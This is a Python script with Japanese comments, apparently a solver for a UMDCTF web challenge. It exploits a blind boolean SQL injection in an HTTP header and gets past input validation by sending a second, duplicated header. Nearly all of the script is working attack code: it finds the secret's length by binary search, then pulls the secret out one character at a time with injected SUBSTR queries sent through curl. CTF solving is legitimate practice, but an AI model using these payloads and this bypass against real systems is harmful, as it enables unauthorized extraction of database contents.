import subprocess
import time
import string
import sys

# 設定
TARGET_URL = 'https://steve-le-poisson-api.challs.umdctf.io/deviner'
# 正規表現 ^[a-zA-Z0-9{}]+$ に基づく許可された文字セット
ALLOWED_CHARS = string.digits + string.ascii_letters +  '{}'
# バリデーション回避のための二番目の X-Steve-Supposition ヘッダーの値
FILLER_HEADER_VALUE = 'x'
# リクエスト間の遅延時間（秒）
REQUEST_DELAY = 0.01
# フラグの最大想定長さ（これ以上の長さはチェックしない）
MAX_FLAG_LENGTH = 100

def check_curl_available():
    """curl コマンドがシステムに存在するかをチェックする"""
    try:
        subprocess.run(['curl', '--version'], capture_output=True, text=True, check=True)
        return True
    except FileNotFoundError:
        return False
    except: # バージョンチェック時のその他のエラーを捕捉
        return False

def send_injected_request(payload):
    """
    注入されたペイロードを最初の X-Steve-Supposition ヘッダーに含む GET リクエストを、
    subprocess を使って curl で送信する
    """
    # curl コマンドを引数のリストとして構築する
    # 注入するヘッダーがバリデーション回避用のヘッダーより先にくるようにリストの順番を調整
    command = [
        'curl',
        TARGET_URL,
        '-s', # サイレントモード（進捗表示などを非表示にする）
        '-H', 'accept: */*',
        '-H', 'accept-language: ja,en-US;q=0.9,en;q=0.8',
        '-H', 'cache-control: no-cache',
        '--compressed', # 可能であれば応答を圧縮する（任意）
        '-H', 'origin: https://steve-le-poisson.challs.umdctf.io',
        '-H', 'pragma: no-cache',
        '-H', 'priority: u=1, i',
        '-H', 'referer: https://steve-le-poisson.challs.umdctf.io/',
        '-H', 'sec-ch-ua: "Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
        '-H', 'sec-ch-ua-mobile: ?0',
        '-H', 'sec-ch-ua-platform: "macOS"',
        '-H', 'sec-fetch-dest: empty',
        '-H', 'sec-fetch-mode: cors',
        '-H', 'sec-fetch-site: same-site',
        '-H', 'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
        # 注入するヘッダー（最初に来る）
        '-H', f"X-Steve-Supposition: {payload}", # Pythonの文字列としてはダブルクォートで囲む
        # バリデーション回避用のヘッダー（後に来る）
        '-H', f"X-Steve-Supposition: {FILLER_HEADER_VALUE}",
    ]

    try:
        # curl コマンドを実行し、出力をキャプチャ
        # print(f"Executing command: {' '.join(command)}") # デバッグ用：実行するコマンドを表示
        result = subprocess.run(command, capture_output=True, text=True, check=False)

        # curl コマンド自身がエラーコードを返した場合のチェック（通常は通信エラーなど）
        if result.returncode != 0:
            # print(f"Curl command failed with exit code {result.returncode}")
            # print(f"Stderr: {result.stderr.strip()}")
            pass # curl自身のエラーが出ても、stdoutに成功メッセージがないかチェックするため続行

        # 標準出力に成功文字列が含まれているかチェック
        output = result.stdout.strip()
        # print(f"Payload: {payload[:50]}..., Output: {output}") # デバッグ用：リクエストとレスポンスの確認
        return "Tu as raison!" in output

    except FileNotFoundError:
        print("エラー: 'curl' コマンドが見つかりません。curl がインストールされ、PATH に含まれているか確認してください。")
        sys.exit(1) # curl が見つからなければ終了
    except Exception as e:
        print(f"subprocess 実行中にエラーが発生しました: {e}")
        return False
    finally:
        # リクエスト間の遅延
        time.sleep(REQUEST_DELAY)

def find_flag_length():
    """ブラインドインジェクションと二分探索を使ってフラグの長さを特定する"""
    print("フラグの長さを探索中...")
    # 効率のために二分探索を使用
    low = 0
    high = MAX_FLAG_LENGTH
    flag_length = None

    # まず、フラグが存在するかどうか（長さ > 0 か）をチェック
    print("フラグの存在を確認中...")
    if not send_injected_request(f"' OR (LENGTH((SELECT value FROM flag LIMIT 1)) > 0) --'"):
         print("フラグが存在しないか、長さが0以下のようです。終了します。")
         return None
    print("フラグの存在を確認しました。")


    while low <= high:
        mid = (low + high) // 2
        # フラグの長さが mid より大きいかをテストするペイロード
        payload = f"' OR (LENGTH((SELECT value FROM flag LIMIT 1)) > {mid}) --"
        print(f"長さ > {mid} をテスト中...")
        if send_injected_request(payload):
            # 長さは mid より大きいので、さらに上を試す
            flag_length = mid + 1 # 暫定的な長さ候補
            low = mid + 1
        else:
            # 長さは mid より大きくないので、mid 以下である。下の方を試す。
            high = mid - 1

    # 二分探索の収束後、最終的な長さが low に格納されているはず
    # 念のため、特定された長さで等号条件を使って確認する
    if flag_length is not None:
         payload = f"' OR (LENGTH((SELECT value FROM flag LIMIT 1)) = {flag_length}) --"
         print(f"特定された長さ {flag_length} を確認中...")
         if send_injected_request(payload):
             print(f"フラグの長さが確定しました: {flag_length}")
             return flag_length
         else:
              print(f"二分探索の結果 ({flag_length}) が等号条件で確認できませんでした。")
              return None # 何か問題が発生した可能性

    print(f"最大想定長さ ({MAX_FLAG_LENGTH}) 内でフラグの長さを特定できませんでした。")
    return None


def find_flag_content(flag_length):
    """特定された長さに基づき、フラグの内容を1文字ずつ抽出する"""
    print(f"\nフラグの内容を抽出中（長さ: {flag_length}）...")
    flag = ""
    for i in range(1, flag_length + 1):
        print(f"位置 {i} の文字を推測中...")
        found_char = None
        # 許可された文字セットを順番に試す
        for char in ALLOWED_CHARS[::-1]:
            print(f"check: {char}")
            # 位置 i の文字が char であるかをテストするペイロード
            # SQL ペイロード内の文字はシングルクォートで囲む
            payload = f"' OR (SUBSTR((SELECT value FROM flag LIMIT 1), {i}, 1) = '{char}') --"
            if send_injected_request(payload):
                found_char = char
                flag += char
                print(f"位置 {i} の文字は: {char} (現在のフラグ: {flag})")
                break # 次の位置に移る
        if found_char is None:
            # 許可された文字セット内に一致する文字がなかった場合
            print(f"位置 {i} で許可された文字が見つかりませんでした。")
            # CTF のルールによっては、不明な文字として扱うか、抽出失敗とみなす
            flag += '?' # 不明な文字のプレースホルダー
            # この位置で不明な文字があっても、その後の文字の特定を試みるためループは続行
            # break # 全て特定できないとフラグにならない場合はここで break

    return flag

# メイン実行部分
if __name__ == "__main__":
    # curl コマンドの利用可能性をチェック
    if not check_curl_available():
        print("Curl コマンドが利用できません。インストールされているか確認してください。")
        sys.exit(1)

    # フラグの長さを特定
    flag_length = find_flag_length()

    if flag_length is not None:
        # フラグの内容を抽出
        final_flag = find_flag_content(flag_length)
        if len(final_flag) == flag_length:
            print(f"\nフラグの抽出に成功しました: {final_flag}")
        else:
            print(f"\nフラグの抽出が不完全な可能性があります。抽出された部分: {final_flag}")
    else:
        print("\nフラグの抽出に失敗しました。")